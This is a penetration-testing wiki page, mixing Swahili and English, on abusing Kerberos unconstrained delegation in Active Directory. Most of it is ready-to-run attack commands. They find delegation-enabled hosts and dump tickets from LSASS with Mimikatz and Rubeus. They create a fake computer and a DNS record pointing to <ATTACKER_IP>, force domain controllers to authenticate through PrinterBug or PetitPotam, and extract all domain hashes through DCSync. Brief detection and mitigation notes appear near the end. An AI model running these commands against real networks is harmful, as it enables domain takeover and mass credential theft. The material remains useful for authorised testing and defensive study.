# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Hii ni feature ambayo Domain Administrator anaweza kuweka kwa **Computer** yoyote ndani ya domain. Kisha, wakati wowote **user logins** kwenye Computer, **nakala ya TGT** ya huyo user itakuwa **inatumwa ndani ya TGS** inayotolewa na DC na **kuhifadhiwa kwenye memory katika LSASS**. Kwa hiyo, ukipata Administrator privileges kwenye machine, utaweza **kudump tickets na kuimpersonate users** kwenye machine yoyote.

Kwa hiyo ikiwa domain admin anafanya login ndani ya Computer yenye feature ya "Unconstrained Delegation" ikiwa imewashwa, na una local admin privileges ndani ya machine hiyo, utaweza kudump ticket na kuimpersonate Domain Admin popote pale (domain privesc).

Unaweza **kupata Computer objects zenye attribute hii** kwa kuangalia kama attribute ya [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) ina [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Unaweza kufanya hivi kwa LDAP filter ya ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, ambayo ndiyo hufanya powerview:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Load the ticket of Administrator (or victim user) in memory with **Mimikatz** or **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
More info: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**More information about Unconstrained delegation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

If an attacker is able to **compromise a computer allowed for "Unconstrained Delegation"**, he could **trick** a **Print server** to **automatically login** against it **saving a TGT** in the memory of the server.\
Then, the attacker could perform a **Pass the Ticket attack to impersonate** the user Print server computer account.

To make a print server login against any machine you can use [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
If the TGT ikiwa kutoka kwa domain controller, unaweza kutekeleza [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) na kupata hashes zote kutoka kwa DC.\
[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Pata hapa njia nyingine za **force an authentication:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Wengine wowote coercion primitive ambao hufanya victim authenticate kwa **Kerberos** kwenda kwa host yako ya unconstrained-delegation pia hufanya kazi. Katika mazingira ya kisasa hii mara nyingi humaanisha kubadilisha classic PrinterBug flow na **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN**, au coercion inayotegemea **WebClient/WebDAV** kulingana na RPC surface ipi inafikiwa.

### Abusing a user/service account with unconstrained delegation

Unconstrained delegation si **limited to computer objects**. **User/service account** pia inaweza kusanidiwa kama `TRUSTED_FOR_DELEGATION`. Katika hali hiyo, sharti la vitendo ni kwamba account hiyo lazima ipokee Kerberos service tickets kwa **SPN it owned**.

Hii husababisha njia 2 za kawaida sana za offensive:

1. Unadhibiti password/hash ya **user account** ya unconstrained-delegation, kisha **ongeza SPN** kwa account hiyo hiyo.
2. Account tayari ina SPN moja au zaidi, lakini mojawapo inaelekeza kwenye **hostname** ya zamani/isiyotumika tena; kuunda upya **DNS A record** iliyokosekana kunatosha kuchukua udhibiti wa authentication flow bila kurekebisha seti ya SPN.

Minimal Linux flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notes:

- Hii ni muhimu hasa wakati principal isiyo na vizuizi ni **service account** na una credential zake pekee, si code execution kwenye host iliyounganishwa.
- Ikiwa target user tayari ana **stale SPN**, kuunda upya **DNS record** inayolingana kunaweza kuwa na noise kidogo kuliko kuandika SPN mpya kwenye AD.
- Recent Linux-centric tradecraft hutumia `addspn.py`, `dnstool.py`, `krbrelayx.py`, na primitive moja ya coercion; huhitaji kugusa Windows host ili kukamilisha chain.

### Abusing Unconstrained Delegation with an attacker-created computer

Modern domains mara nyingi zina `MachineAccountQuota > 0` (default 10), ikiruhusu principal yoyote iliyothibitishwa kuunda hadi N computer objects. Ukishikilia pia `SeEnableDelegationPrivilege` token privilege (au rights zinazolingana), unaweza kuweka computer mpya uliyoiumba iaminike kwa unconstrained delegation na kuvuna inbound TGTs kutoka kwa systems zenye privilege.

High-level flow:

1) Create a computer you control
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Fanya fake hostname iweze kutatuliwa ndani ya domain
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Wezesha Unconstrained Delegation kwenye kompyuta inayodhibitiwa na mshambuliaji
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Kwa nini hii inafanya kazi: na unconstrained delegation, LSA kwenye kompyuta iliyo na delegation-enabled huhifadhi inbound TGTs. Ukiilaghai DC au privileged server ijithibitishe kwa fake host yako, machine TGT yake itahifadhiwa na inaweza ku-exported.

4) Start krbrelayx in export mode and prepare the Kerberos material
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Lazimisha uthibitishaji kutoka kwa DC/servers kwenda kwenye fake host
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx itahifadhi faili za ccache wakati mashine inapofanya uthibitishaji, kwa mfano:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Tumia TGT ya DC machine iliyokamatwa kufanya DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Dokezo na mahitaji:

- `MachineAccountQuota > 0` huwezesha uundaji wa kompyuta bila ruhusa za juu; vinginevyo unahitaji rights za wazi.
- Kuweka `TRUSTED_FOR_DELEGATION` kwenye kompyuta kunahitaji `SeEnableDelegationPrivilege` (au domain admin).
- Hakikisha name resolution kwa host yako bandia (DNS A record) ili DC iweze kuifikia kwa FQDN.
- Coercion inahitaji vector inayofanya kazi (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, n.k.). Lemaza hivi kwenye DCs ikiwa inawezekana.
- Ikiwa account ya victim imewekwa kama **"Account is sensitive and cannot be delegated"** au ni mwanachama wa **Protected Users**, forwarded TGT haitajumuishwa kwenye service ticket, hivyo chain hii haitatoa reusable TGT.
- Ikiwa **Credential Guard** imewezeshwa kwenye authenticating client/server, Windows huzuia **Kerberos unconstrained delegation**, jambo ambalo linaweza kufanya coercion paths zinazofanya kazi vinginevyo kushindikana kutoka kwa mtazamo wa operator.

Detection na hardening ideas:

- Toa alert kwenye Event ID 4741 (computer account created) na 4742/4738 (computer/user account changed) wakati UAC `TRUSTED_FOR_DELEGATION` imewekwa.
- Fuatilia DNS A-record additions zisizo za kawaida kwenye domain zone.
- Angalia spikes za 4768/4769 kutoka hosts zisizotarajiwa na DC-authentications kwenda non-DC hosts.
- Zuia `SeEnableDelegationPrivilege` kwa seti ndogo, weka `MachineAccountQuota=0` pale inapowezekana, na lemaza Print Spooler kwenye DCs. Tekeleza LDAP signing na channel binding.

### Mitigation

- Punguza DA/Admin logins kwa specific services
- Weka "Account is sensitive and cannot be delegated" kwa privileged accounts.

## References

- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- krbrelayx: https://github.com/dirkjanm/krbrelayx
- Impacket addcomputer.py: https://github.com/fortra/impacket
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
- Praetorian – Unconstrained Delegation in Active Directory: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
- Microsoft Learn – Protected Users Security Group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

{{#include ../../banners/hacktricks-training.md}}
